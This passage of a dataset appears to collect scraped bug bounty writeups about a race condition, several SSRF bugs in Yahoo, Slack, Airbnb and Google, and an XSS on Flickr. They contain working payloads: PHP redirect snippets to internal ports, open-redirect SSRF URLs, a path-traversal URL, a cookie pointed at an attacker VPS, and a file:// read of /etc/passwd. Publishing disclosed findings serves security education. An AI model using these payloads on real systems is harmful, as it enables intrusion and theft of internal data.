attack methods xss attack style xss attack vector xss attack vectors xss bypass xss bypass payload xss html bypass xss keylogger xss payload xss reflected payload xss stored xss stored payload xss vulnerability"}
{"source_url": "https://medium.com/@vincenz/exploiting-a-race-condition-vulnerability-3f2cb387a72", "title": "Exploiting a Race Condition Vulnerability | by V7nc3nz | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@vincenz/exploiting-a-race-condition-vulnerability-3f2cb387a72. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nExploiting a Race Condition Vulnerability | by V7nc3nz | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Exploiting a Race Condition Vulnerability V7nc3nz 5 min read · Apr 22, 2020 -- 2 Listen Share Press enter or click to view image in full size Remember this , a famous dialogue from a Bollywood movie 3 idiots. In a race the one who cross the finishing line 1st becomes 1st. Ever thought if all the participants completes the finishing line at the same time. Sounds nice… But is it practical in a real life scenario ? That’s the interesting part. What is race condition? A race condition occurs when multiple threads can access shared data and they try to change it at the same time. Because the thread scheduling algorithm can swap between threads at any time, you don’t know the order in which the threads will attempt to access the shared data. Therefore, the result of the change in data is dependent on the thread scheduling algorithm, i.e. both threads are “racing” to access/change the data. Let’s take an example to understand this scenario . Concurrency in go that can lead condition Here 2 goroutines are fired and they are provided a simple task just to initialize in a value in “value” variable and increment & print that value. Finally when both goroutines complete , the value of “counter” variable should print. Expectations : The expected output should be output of the current example code Yes , we got as expected . But wait a moment, hit the same code multiple times and observe the output. Press enter or click to view image in full size The same code when hit multiple times Now we understood what exactly is the problem. Both the goroutines are trying to access the same memory location simultaneously . Although this issue can be resolved simply by adding mutexes to handle this concurrency. But here we are highly interested on how this race condition can be useful for an attacker . Where Can I look for such scenario ? Bug hunting is all about understanding the flow of a web application or a mobile application. The more you understand the target, the easier will be to exploit that as well. The critical sections that can be vulnerable to such type of scenario where two or more sources tries to access the same resource. The most common attack vectors are the section which contains coupon code, invite code, or any other data that can be used only once for a particular user. well this makes sense now….. Press enter or click to view image in full size How I found a similar bug in a bug bounty program! So, I was looking in a public program that was present for a long time in Bugcowd. I started with the recon phase. While my recon was in background I was observing the functionalities and behavior of that web app . There was a section on invite friends as this feature comes now in most of the companies . I was interested in what will happen if I invite some friends. They had multiple rewards for this depending upon the country . Like there was one option for UK , whenever a user invites 3 friends and they spend 200 GBP (each) . The user who invited them will get a reward of 50GBP(pounds). How this invite works? while inviting I saw 2 options Invite through link Invite through coupon code I thought let’s play with the coupon code . Here an idea came in my mind how about the friend I’ve invited hits the coupon code again and again & server accepts those requests but I can see user can hit these code only once. Then I thought to look for race condition, but how this can help here? Suppose I have invited 18 users so when these 18 users will spend 200GBP each (i.e 18*200 = 3600GBP) , I’ll get 50GBP for each 3 users(i.e 6*50=300GBP) . Time to attack Requirements : Two user accounts (user1 , user2) Turbo Intruder (BurpSuite’s plugin) Turbo Intruder is way much powerful tool that has the ability to send 30,000 requests per sec If it is configured in that way. For installation and usage of turbo intruder , I’ve found the perfect tutorial here : https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack From user1 account I took the invite coupon. There was an option in profile if you forget to enter your invite code while signup then you also have an option to enter it afterwards. So, I sign up with the user2 account and went to the section to enter invite code, that I’ve copied from user1 account. Then I entered that coupon code and captured that request in Burp proxy. In the body section I can see the request like this {“referralToken”:”invitecode”} Double click on the invite code to select and send the request to turbo intruder Then I could see the request like this POST /gateway/v1/virality/guests/18343692/referrals HTTP/1.1 Host: example.com User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 . . Cookie: {cookie_value} {“referralToken”:”%s”} As we can notice, turbo intruder set the selected invite code as %s Turbo intruder supports the python script to configure and run the request as we want. I hit the script in script section. Turbo Intruder script Run the attack We can see there are around multiple responses that has 200 status code and rest 40x Turbo intruder attack Now to confirm if these requests are accepted by the server and invitation reflects in the user1’s profile. I switched in the user1 account and checked my invited users . user1 profile Yes, the race condition vulnerability was exploited successfully. Now the Impact As we can see user1 has invited user2 multiple times (Let’s say 18) . So when user2 will spend 200GBP , here all the 18users are same (u1,u2…u18=user2) user 1 will get 50*6=300GBP(i.e 50*{total_invite/3}). Bug Bounty Race Condition Exploitation Hall Of Fame Bugcrowd -- -- 2 Written by V7nc3nz 56 followers · 31 following Application Security Analyst | Tech freak Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@th3g3nt3l/how-i-found-an-ssrf-in-yahoo-guesthouse-recon-wins-8722672e41d4", "title": "How i found an SSRF in Yahoo! Guesthouse (Recon Wins) | by Th3G3nt3lman | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@th3g3nt3l/how-i-found-an-ssrf-in-yahoo-guesthouse-recon-wins-8722672e41d4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow i found an SSRF in Yahoo! Guesthouse (Recon Wins) | by Th3G3nt3lman | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How i found an SSRF in Yahoo! Guesthouse (Recon Wins) Th3G3nt3lman 4 min read · Oct 20, 2017 -- 18 Listen Share Hi Guys, As i said before sharing is caring, here i am describing one of my findings that was closed 2 weeks ago in yahoo Guesthouse https://gh.bouncer.login.yahoo.com/ and i am describing in details, how recon helped me finding a vulnerable endpoint where i achieved the SSRF. As mentioned publicly Yahoo! Guesthouse is a set of administration tools used by Yahoo! on a daily basis. They allow Yahoo! administrators to control all aspects of the Yahoo! network, from mail and hosting accounts to server settings and hosting management. Certain parts of the system, such as error reporting tools, are also available to Yahoo!’s customer services team. If you hunt a lot in yahoo you will notice that when you try to open some subdomains in browser you will be redirected to yahoo gueshose login page where you should enter a username and a password related to yahoo employees and then you will be redirected to the subdomain you are trying to reach as per the below : Press enter or click to view image in full size Yahoo Guesthouse login page I remember that i did scan that before, tried alot to search for vulenrable endpoints, hidden folders/files and couldn't achieve anything out of it, and obviously i don't have credentials to login,but working on another subdomain helped me finding the vulnerable endpoint in that target. Recon : so during my normal recon for yahoo i found that target https://alpha.keyserver.yahoo.com/ when you open it you will get not found response as per the below : Ok, challenge accepted :) so doing dirsearch took time in that target and result was great, i found a SAML endpoint https://alpha.keyserver.yahoo.com/saml that redirected me to the Yahoo Guesthouse login page i mentioned, but new thing appeared :D, it says after successful login you will be redirected to to a SAML endpoint , the endpoint was new to me in yahoo Guesthouse as per the below : See the redirected to path So doing view source to the page i was able to see the full endpoints which is : https://gh.bouncer.login.yahoo.com/simplesaml/saml2/idp/SSOService.php?SAMLRequest=nFjXkuJI073vpyDYS6JbBgkkYnu%2BkAMECJCQkLmTKXmHSv7p%2F4Aew8zO9r%2B7Vx1deTLrZObJLODP%2F%2FVZOmlBBaMif59ib%2Bh0AnK38KI8eJ9q6vqVmv7vy8uf0M5SvFwxTR3mCrg1ANaTPktzuPqwvE%2BbKl8VNozgKrczAFe1u7ow0mGFv6Grsirqwi3S6ZPP5x42hKCqoyJ%2FdoFR8D4N67pcIUjXdW%2Fd%2FK2oAgRHURRBaaTPUg9GwR%2FTici%2FT5cegTqe573SzsJ7peZL9BUA23ulaYDhPrW0F%2BhiOrl%2Byxy%2FZ37%2BypON8o8CfEbR%2BQDB1VZVz6%2Fn00WdTphvtLkih00Gqguo2sgFmnL4YA5XCGKnZWi%2FJWCAoGpB9TbYYVG8uUW2Iog58kgUFtMJD2Ad5Xb9oPfNNwjfnKLJXVC9pUUQ5T%2BcERhlZQru7o8YOBJ5JXK5nL5SeCvDcjpZF5ULHl18n%2Fp2CsF0IkLYADGHtZ3X71McxZavKPWKkipGrnBqRc7f5jSNzlEKm1t%2Fn6GYe6B%2Fn6LTCVPXVeQ0NfhARHnwK%2BTLy2QymXxoavW4vnoW0z9Vxpd%2FVdA%2Fkef7nimUq6OdAZE%2FF2nkDhMmTYuOq4Bdg%2FdpXTXgUbXMrj%2FndT%2BJvFf%2FAV3VlZ3DCOT1FPn5qq%2FDA7xHE7gir0H%2F30aJK7LSriJ4lwfobbf%2BWtfvt62er%2BBSG0IF%2BP9hAr98CnNX7j00gKuzDWFXVN59ioBbA0%2B9F6Esqvqj9r%2Fl87U6yGfleaogjILVJQpyu24qMBG99%2Bn3%2F7Bf8%2F%2BGBZ6Y%2B8UP408Azs6LPHLtNBofoyaBOiy8CZMGRRXVYfY3CwdDMPS%2BcF5B7766GJH%2F8a3Rv6XwIPgPQ%2F%2B0yypov8LQxv42ugJ8UIHcBRNNEd%2Bnf%2FyjtfdzrJ%2FiPXp2FzH8K%2Bj3wH%2BXEMhbkBYl8F7ht7r8mtsPQfx%2FhL6T4aMAwPq%2FFPh3xf1N6KudNuCLVHcSrrazIFCOurlAuxTwhNIimhe8%2F2D87PHy%2B6S%2Bd%2B1Jsshnmv2rmj7iX8du4AUTm0WZgeqjNA9D76Ag%2FTkOjzKUJP4mRUlyvZ2o%2BdJvFrHI4OBISSYu9Kp6sr2XERyos0OdttZtxwo7fMssS3KxhgRdJhW%2FH%2FryjN2o%2BtJzSeNUxYZWuyAt8nGZ8l7rWu6L44472C8Mut8ruFnqRqni5ZgTokGAdbrbjXw66pdZKaTKFjuDdpHwRmjvoZUfPQuljRdtnDVXbGAa9DyeWd3ZCRHtO7Lf7RskOG4a%2FQDoOKKJRrCWF3YXLReO4HvD2Wi1ZUzK7At%2BdOmU6G9JEHJbhp7HPuLgxKItC4KaASBJBkftTSde81h9KeUNxurIheZ8wjycotCyXuCaNhaR4zG7JbcMh03a7cz%2BclTymJebkciKhTsS3sw%2F5JTYCTecUKOIznBrPhud%2FeKkvsgBx2DRRXQv2lhWXnZp3dhOdMclrTRPl8oFENsyCdaLiDAZdLdRHVNOoy2x3m%2BGUoypl722hsORCYk0QwuTIqlD1eLQ2Q59nni2V2On075VSr1BiGS0lxLfJVej0azlbUnuzjH6UojoGW2afdR1g2ZRrnSuJYrcSgdotVVf3NjqqBOXMFyva9%2FBI99OeKRkWYegSz%2Br0vaFuuGojRS3pKC3Ob6%2BDIfTooluBYZ32S2mNCq3zzPmvBtK0TscelVlMHrRBMCKt6OZGOVLMwPn0h8R9wApvEFughoEveck47gndL3Jig2H4wLuZKL5%2FrPWn%2BT8V73vwfDJ9jZIlObt2v5kfu8Q7v6S%2BZFr1%2BCLJIpCwnMcM48CphNZJhA5IZY7XjZ3%2B8ISw9Y9MrJwYGWmC0y050ZmxwbHK8uYKpNeVUmROkE2%2Bassi0JX8qbel1ZGD06WhpIidgLzsG2FLlU9nWyAYYXORuuFkVE%2B4hQql6ahvaFbUUgbcyD67ch4HzaorpO0ecTT16it0424VlITDxsH71trnjxhJXWd7VpPJ2PL2I2mjsFDfkydjTXautdYutxtQ%2FcoqWZ3UkX88ZeXMf1%2BFgvdiZf672cxS0oy7LiPvDZCt7tqo6BKrLBhME3gWGkv42to61brZmRpqk%2B2UNrr%2BrpwcCq46GR8iAVfYtEPWy%2FpF53MnPmuNg2ldHAiuG6usb0hW2dD50D9gWV6STczGnOyY%2Brmx9DRu8bFr%2Fc9UVo4mVr3nl3EX%2FvEsjLDB4FwZu52ueCCQGAZyScNnwPi3mAS%2B1awR3shp%2B7C5sfIa4KLEC4lpzq1qujlRaTeDGVkvMgoNO6UMXkeooWGbvKhE9ett8CKY2hoB7Rq3bxlzzEfS0lTEmv36g7nTKWILsOyZjO6zsZAaY0jrP1NJnvb5lTW4bbH8Hh2ySTjD5cjDW0wdKlMEr3m%2BYt6f8Os2ZalKOZoisuDB%2FpjKBG935OukHhDQVOyX7Gz4raReJ2mtO2JFXfHxYFpJFpeurmXEPtNhKAhOJlMiVTNyTP5BTKkNcKqekgubok6P6B2wOnqSbSAjBJb1G2HgFzozca6ZGrltzPqFhQCJRZbn%2BJqZx6whEcYsm84hXdGEGKhL%2B25sL3RKMd0AsPYJ46RYRcEwlZiknvvPKGTOYlhugNj7kzREhnTIeRAOLIspW81urN0UtXQLlDwa2MZu9DbXBNRuPdZKa0sjU1DSb%2FqwOMDWWdZxTgyJ0ggw6gZUijfMovhBbO%2BhV4Vc2x1nzEFjVlxk0jiJizMjVqKG1kSN8d%2FqeOLxDIPG9tLO21%2BbZw8xU29T5%2FmfC90pWXqYesM7M7JpEZSqG77YTsIvbVzsns8LPQ2aetErGbpx8LJaOjgHvmE5YXeipz5tTHx6%2BDi69rhyNHS%2B8zF09zJrkkQJEy5Za%2Fs7KxokPndTuIf%2Bhb2g41dm1N2jfy2DYw4Ol1CdgCXDukP%2BgD2JCnKZX4ZUJPYyki2PmOKcE3wECpByt7q8pCs9%2Fu1Chp7JlehWMaX0kPWh0a0jC7a7uHoioKeh1ony9XGinzzbOaKCOzkcIKFY6mxQmJ0GwZiy1pavrs6veb2B%2FcMpYQ%2BHQjBxWUIGeR2kVPdyRfSzoiH09kT93CBdxikF5raIgl69LZ2FKdk0wSqIXutrx8dq8HWtN1ZXVG7LSH6DiPRCmjcthyGWChzrFqM%2FSAuCgq1LU9po9qRQubgjEHV4jprNfN0js3m5G3Dr7c9lFAMD12e9kae1bjtUbmtSVdS62odM%2Fvl4iLCXacj8xkB0ad36ddX428%2Bx%2F31%2Fflh%2B%2Bnl%2Bs2L9%2BXl%2B7ee559VvvxfAAAA%2F%2F8%3D Now for those who don't know, SAMLRequest and SAMLResponse in SAML are base64 encoded XML , So after decoding it and trying to test for XXE and SSRF in the XML request you might get a good bug, but i failed to exploit it , for more information about this technique you can refer to the amazing write up from @seanmeals https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf that worked for me in another private program. What to do now ? So even though i could exploit this, even though i also tried to bypass the SSO itself, i couldn't just move on, tried to dig more and more in this , so when i was checking the request in burp i found something special in the GET request for the above endpoint, there was a cookie BouncerSAMLRemoteSessionHost=bouncer12-os.gh.bf2.yahoo.com; as you can see the cookie value is a website/yahoo subdomain so there is a high chance for an SSRF here. BINGO!!! Yes i was right, as you can see below i added my VPS ip address with port 4566 in the BouncerSAMLRemoteSessionHost cookie and i had netcat listening in my VPS and received a request from dip2.gq1.yahoo.com (63.25.204.23) port 48633: Press enter or click to view image in full size Its also important to mention that if you don't have VPS, Collaborator everywhere in burp can help you testing that thanks to @albinowax as i also confirmed that host is vulnerable to external DNS interactions in the X-Forwarded-For, so i could have just put the same value that burp sends in the cookie and confirm the issue without using a VPS. tried to read files or escalate this ssrf and couldn't, so i reported to yahoo and got triaged immediately, bounty not received yet but hope it will be good. Key Points Here : 1- Recon Wins, see where i reached from a “not found” response on a subdomain to a bug in another subdomain. 2- Never give up, put more efforts in what you are doing and read other hunters write-ups as it will help you to find bugs in other places. 3- For those who don't share findings where they can, i will not blame you, its your choice and i respect that but if you can just do it, do it for the community, for the new hackers here, small informations like this will help them to understand HOW to look for bugs and exploit them, we are not doing Black Magic here :) Security Bug Bounty Hackerone -- -- 18 Written by Th3G3nt3lman 2.7K followers · 3 following Security Researcher / Bug Bounty Hunter / https://twitter.com/Th3G3nt3lman Responses ( 18 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb", "title": "Reading Internal Files using SSRF vulnerability | by Neeraj Sonaniya | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReading Internal Files using SSRF vulnerability | by Neeraj Sonaniya | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reading Internal Files using SSRF vulnerability Neeraj Sonaniya 2 min read · Oct 16, 2017 -- 6 Listen Share I am hunting on one private program since last 8 months, since it doesn’t allow disclosure i will keep organization REDACT, in requests i will use ‘example.com’ as its name. I am going to show how i was able to read internal files of an organization using Server Site Request Forgery vulnerability. While searching for vulnerability, i encountered with one ‘JavaScript’ file. I unminified that JavaScript into readable form using http://unminify.com/ , while searching for new endpoints in that JavaScript file for more chances of getting vulnerabilities, i found one function: Press enter or click to view image in full size Function After analyzing it i was able to make request from above function as follows: Request made from function Here you can see an interesting parameter ‘filehookURL’ , so i thought it is SSRF issue because i got the response of https://www.REDACT.com , so i confirmed that it is SSRF and hence my next target was, if i can read internal files of organization. The next is to test dangerous URL schemas such as file :/// , dict:// , ftp:// and gopher :// , but i was lucky enough and i was able to read internal files from file :/// scheme. Here is the request i made to read ‘/etc/passwd’ file : Final Request to read /etc/passwd file And here is the response: I immediately reported it to the organization, and the team was very fast in response. They fixed the issue within 2 hrs of their first response and awarded me with generous bounty. So, never forgot to look into JavaScript files, as it is possible to get new endpoints from them. I hope you learned something from it. Thanks for reading. Bug Bounty Infosec -- -- 6 Written by Neeraj Sonaniya 882 followers · 67 following Whitehat Security Researcher Responses ( 6 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@elberandre/1-000-ssrf-in-slack-7737935d3884", "title": "$1.000 SSRF in Slack. How I got a $1,000 SSRF on Slack using… | by Elber Andre | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@elberandre/1-000-ssrf-in-slack-7737935d3884. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n$1.000 SSRF in Slack. How I got a $1,000 SSRF on Slack using… | by Elber Andre | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in $1.000 SSRF in Slack Elber Andre 4 min read · Feb 17, 2019 -- 1 Listen Share Before I start, I have two important tips for anyone starting in the world of BugBounty. 1: Always check previous reports, you may know some bypass that may work in that situation, or you can learn something new. 2: If you like content about Bug Bounty or other hacking related stuff, sign up for my channel and follow the new posts. Elber Tavares BugBounty, CTF, Writeups e outros temas aleatórios. www.youtube.com SLACK AND SSRF: Press enter or click to view image in full size Slack is the collaboration hub that brings the right people, information, and tools together to get work done. From Fortune 100 companies to corner markets, millions of people around the world use Slack to connect their teams, unify their systems, and drive their business forward. Slash Commands; “SSRF in api.slack.com, using slash commands and bypassing the protections.” You can learn more about Slash Commands Here : “Some Slack features like “Integrations / Phabricator” and “Integration / Slash Commands” allow users to submit URL that will be accessed by the backend servers. A blacklist tries to forbid access to internal resources (loopback, 10.0.0.0/8, 192.168.0.0/24, …). This blacklist can be bypassed using “[::]” as the hostname. Only services binding all the interfaces and supporting IPv6 can be reached using that vector.” Said user agarri_fr for the slack. Press enter or click to view image in full size Slack has disabled the option to register IPV6 addresses in your Slash Commands. slacka : ‘ I created a new issue for the ipv6 blocking and escalated the case with our engineers. I’ll let you know when we have an update.’ ~Fixed~ For them, a fix, for me, a bypass. To bypass this new protection, I used a redirect with the ‘Location’ header in PHP. in your own domain: index.php <?php header(\"location: http://[::]:22/\"); ?> location: http://[::]:22/ And save. Go to your Slack and type /youslash Try with my server http://hackerserver[.]com/ Results: :22 :25 Jul 13th — First response Jul 18th — Triaged Jan 23 — Slack rewarded elber with a $500 bounty. After I found this bypass, I looked for more vulnerabilities in Slack, and I found the Event Subscriptions parameter. “Bypass of the SSRF protection in Event Subscriptions parameter.” The vulnerability is present in the “Event Subscriptions” parameter where: “ Your app can subscribe to be notified of events in Slack (for example, when a user adds a reaction or creates a file) at a URL you choose. \". URL: https://api.slack.com/apps/YOUAPPCODE/event-subscriptions? When we add a site that does not meet API standards, we receive the following message: Press enter or click to view image in full size Your request URL gave us a 500 error. Update your URL to receive a new request and challenge value. Bypass using an IPV6 vector [::] . On my host, x.php has: <?php header(\"location: \".$_GET['u']); ?> PoC: http://hacker.site/x.php/?u=http://%5B::%5D:22/ Response: SSH [::]:22 SMTP [::]:25 This report Slack selected as a duplicate of another SSRF, I insisted that they put me as a participant in the other report. I saw that the other report was different from mine, so I told the team that they could have been wrong. Press enter or click to view image in full size Jul 24th — Duplicated Sep 2nd — Triaged Jan 23 — Slack rewarded elber with a $500 bounty. References: https://hackerone.com/reports/61312 (The reports will be publicly disclosed on Hackerone on 02/22) https://hackerone.com/reports/381129 https://hackerone.com/reports/386292 Slack Hackerone Bugsbounty Hacking Ssrf -- -- 1 Written by Elber Andre 554 followers · 55 following Pentester , CTF player, Bug Hunter & Security Researcher \\nTwitter: https://twitter.com/elber333 Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/", "title": "Abusing CORS for an XSS on Flickr – Jack", "friendly_explanation": "This is a bug bounty writeup from https://whitton.io/articles/abusing-cors-for-an-xss-on-flickr/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAbusing CORS for an XSS on Flickr – Jack Open Menu Home About Jack I participate in bug bounty programmes Learn More Email Twitter GitHub Posts All Posts All Tags Image source: _robson_ Abusing CORS for an XSS on Flickr December 12, 2013 Reading time ~1 minute I recently found an XSS on the mobile version of Flickr ( http://m.flickr.com ). Due to the way the bug is triggered, I thought it deserved a write-up. Whilst browsing the site, you’ll notice that pages are loaded via AJAX with the path stored in the URL fragment (not as common these days now that pushState is available). When the page is loaded, a function, q() (seen below), is called which will check the value of location.hash , and call F.iphone.showSelectedPage() . In order to load pages from the current domain, it checks for a leading slash. If this isn’t present, it prepends one when calling the next function, F.iphone.showPageByHref() . This function then performs a regex on the URL (line 160) to ensure that it’ll only load links from m.flickr.com . If this check fails, and the URL starts with a double slash (relative protocol link), it prepends it with http://m.flickr.com . Pretty solid check, right? Incase you didn’t notice, the first regex doesn’t anchor it to the start of the string. This means we can bypass it providing our own URL contains m.flickr.com . We can get our own external page loaded by passing in a URL like so: //fin1te.net/flickr.php?bypass=m.flickr.com The code will check for a leading slash (we have two :)), which it’ll pass, then checks for the domain, which will also pass, then load it via AJAX. Since we now have CORS in modern browsers, the browser will send an initial OPTIONS request to the page (to ensure it’ll allow it to be loaded), then the real request. All we need to do is specify a couple of headers (the additional options in the Access-Control-Allow-Headers are to prevent syntax errors in the Javascript), along with our payload. The next part of the Javascript dumps the response into an element with innerHTML . Which leads to our payload being executed. Fix This issue is now fixed by anchoring the regex to the start of the string, and also running another regex to check if it starts with a double slash. websec bugbounty yahoo flickr xss cors Updated on December 12, 2013 Jack Like Tweet +1 Read More From Bug Bounty Hunter, to Engineer, and Beyond A couple weeks ago I had my last day on Facebook's Product Security team. Abittersweet moment, but one which marks a \"new chapter\" in my ...… Continue reading Obtaining Login Tokens for an Outlook, Office or Azure Account Published on April 03, 2016 Uber Bug Bounty: Turning Self-XSS into Good-XSS Published on March 22, 2016 © 2020 Jack. Powered by Jekyll using the HPSTR Theme ."}
{"source_url": "https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/", "title": "Airbnb – Chaining Third-Party Open Redirect into Server-Side Request Forgery (SSRF) via LivePerson Chat | ziot", "friendly_explanation": "This is a bug bounty writeup from https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAirbnb – Chaining Third-Party Open Redirect into Server-Side Request Forgery (SSRF) via LivePerson Chat | ziot Menu Skip to content BLOG RESUME TWITTER < Back Airbnb – Chaining Third-Party Open Redirect into Server-Side Request Forgery (SSRF) via LivePerson Chat March 9, 2017 February 25, 2024 Update (3/15/2017) : LivePerson reached out to me (3/9/17) after this write-up was posted and pushed out changes to patch the open redirect vulnerability. Props to their security team for following up on that! Authors: Ben Sadeghipour Brett Buerhaus Ben and I spent more time on Airbnb the past few months and discovered a new endpoint that we had never seen before. After spending a year or so on the program, we were at the point of trying to find a new approach looking for vulnerabilities. We had the idea of going through all of the js files on Airbnb looking for new endpoints. We were already doing this manually to some degree, but decided to try and automate it. So we built a new tool that grabs js files and looks for relative URLs: Doing this we quickly found new endpoints that we had missed and found a few new vulnerabilities to report. One of the new endpoints discovered led to finding a Server-Side Request Forgery vulnerability on Airbnb. Airbnb Live Chat https://www.airbnb.com/chat We couldn't actually find the chat implemented anywhere, but we noticed the endpoint was in a JS file on the support page. Looking at the JavaScript code, we found a few AJAX requests relative to the /chat endpoint: /chat/availability /chat/estimatedWaitTime /chat/request /chat/events /chat/info/visitorTyping /chat/preSurvey After a little bit of fuzzing, we discovered this error message on https://www.airbnb.com/chat.asdf : {\"error\":{\"time\":\"2017-02-20T20:41:13.916-05:00\",\"message\":\"null for uri: /api/account/33963583/chat.asdf?v=1&param=6114639610801186\",\"internalCode\":28}} I have spent some time looking at LivePerson in the past, so I recognized that they were making API requests to the LivePerson REST API. It also appeared that the user input path is being put in the API request. Being able to specify a URL here wouldn't matter if it's hitting the LivePerson server, but it's possible that whatever is making the API request allows redirects. I reported an open redirect vulnerability to LivePerson in the past, but I never received a response regarding it. I knew it probably still exist and spent some time trying to find it. After going through the API docs a bit, I discovered that the visitorWantsToChat action would cause a header redirect with request parameter onlineURL . Open Redirect http://sales.liveperson.net/hc/5198728/?cmd=file&file=visitorWantsToChat&onlineURL=//xss.buer.haus/ssrftest&site=5198728 SSRF Payload Once we found the open redirect, we were able to make the API request to LivePerson redirect for full URL SSRF. https://www.airbnb.com/chat?cmd=file&file=visitorWantsToChat&onlineURL=https://xss.buer.haus/ssrf&site=5198728 Relative Path Traversal in Path Parameter Another interesting discovery is that you are able to traverse the LivePerson API request backwards with an encoded %5C in the path parameters. This allowed you to make calls to other endpoints on the LivePerson domain other than /api/ such as admin. Example: https://www.airbnb.com/chat.html/a..%5C..%5C..%5C..%5C..%5Casdfhc/5198728/?cmd=file&file=visitorWantsToChat&onlineURL=https://xss.buer.haus/ssrf&site=5198728 Timeline: - 2/16/17: Reported and fixed within 30 minutes"}
{"source_url": "https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/", "title": "Into the Borg – SSRF inside Google production network | OpnSec", "friendly_explanation": "This is a bug bounty writeup from https://opnsec.com/2018/07/into-the-borg-ssrf-inside-google-production-network/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nInto the Borg – SSRF inside Google production network | OpnSec OpnSec Open mind Security and Crypto! Primary Menu Skip to content OpnSec About Me Into the Borg – SSRF inside Google production network July 20, 2018 | 7 Comments Intro – Testing Google Sites and Google Caja In March 2018, I reported an XSS in Google Caja , a tool to securely embed arbitrary html/javascript in a webpage. In May 2018, after the XSS was fixed, I realised that Google Sites was using an unpatched version of Google Caja, so I looked if it was vulnerable to the XSS. However, the XSS wasn’t exploitable there. Google Caja parses html/javascript and modifies it to remove any javascript sensitive content, such as iframe or object tags and javascript sensitive properties such as document.cookie. Caja mostly parses and sanitizes HTML tags on the client side. However, for remote javascript tag (<script src=”xxx”>), the remote resource was fetched, parsed and sanitized on the server-side. I tried to host a javascript file on my server (https://[attacker].com/script.js) and check if the Google Sites server would fall for the XSS when parsed server-side but the server replied that https://[attacker].com/script.js was not accessible. After a few tests, I realised that the Google Sites Caja server would only fetch Google-owned resources like https://www.google.com or https://www.gstatic.com, but not any external resource like https://www.facebook.com. That’s a strange behavior because this functionality is meant to fetch external resources so it looks like a broken feature. More interestingly, it is hard to determine whether an arbitrary URL belongs to Google or not, given the breadth of Google services. Unless… Finding an SSRF in Google Whenever I find an endpoint that fetches arbitrary content server-side, I always test for SSRF. I did it a hundred times on Google services but never had any luck. Anyway the only explanation for the weird behavior of the Google Caja server was that the fetching was happening on the internal Google network and that is why it could only fetch Google-owned resources but not external resources. I already knew this was a bug, now the question was whether it was a security bug! It’s very easy to host and run arbitrary code on Google servers, use Google Cloud services! I created a Google App Engine instance and hosted a javascript file. I then used the URL of this javascript file on Google Sites as a external script resource and updated the Google Sites page. The javascript was successfully fetched and parsed by Google Caja server. I then checked my Google App Engine instance logs to see from where the resource was fetched and it came from 10.x.x.201, a private network IP! This looked very promising. I used the private IP as the url for the Google Sites javascript external resource and waited for the moment of truth. The request took more than 30 seconds to complete and at that time I really thought the request was blocked and I almost closed the page since I never had any luck with SSRF on Google before. However, when Google Caja replied, I saw that the reply size wasn’t around 1 KB like for a typical error message but 1 MB instead! One million bytes of information coming from a 10.x.x.x IP from Google internal network, I can tell you I was excited at this point! 🙂 I opened the file and indeed it was full of private information from Google! \\o/ Google, from the inside First I want to say that I didn’t scan Google’s internal network. I only made 3 requests in the network to confirm the vulnerability and immediately sent a report to Google VRP. It took 48 hours to Google to fix the issue (I reported it on a Saturday), so in the meantime I couldn’t help but test 2-3 more requests to try to pivot the SSRF vulnerability into unrestricted file access or RCE but without luck. The first request was to http://10.x.x.201/. It responded with a server status monitoring page of a “Borglet”. After a Google search, I could confirm that I was indeed inside Borg, Google’s internal large-scale cluster management system ( here is a overview of the architecture). Google have open sourced the successor of Borg, Kubernetes in 2014. It seems that while Kubernetes is getting more and more popular, Google is still relying on Borg for its internal production infrastructure, but I can tell you it’s not because of the design of Borg interfaces! (edit: this is intended as a joke 😛 ) The second request was to http://10.x.x.1/ and it was also a monitoring page for another Borglet. The third request was http://10.x.x.1/getstatus, a different status monitoring page of a Borglet with more details on the jobs like permissions, arguments. Each Borglet represents a machine, a server. On the hardware side, both servers were using Haswell’s CPU @2.30GHz with 72 cores, which corresponds to a set of 2 or 3 Xeon E5 v3. Both servers were using the CPUs at 77%. They had 250GB of RAM, which was used at 70%. They had 1 HDD each with 2TB and no SSD. The HDD were almost empty with only 15GB used, so the data is stored elsewhere. The processing jobs (alloc and tasks) are very diverse, I believe this optimizes ressource usage with some jobs using memory, others using CPU, network, some with high priority, etc… Some services seem very active : Video encoding, Gmail and Ads. That should not be surprising since video processing is very heavy, Gmail is one of the main Google services and Ads is, well, Google’s core business. 😉 I didn’t see Google Sites or Caja in the jobs list, so either the SSRF was going through a proxy or the Borglet on 10.x.x.201 was from a different network than the 10.x.x.201 IP 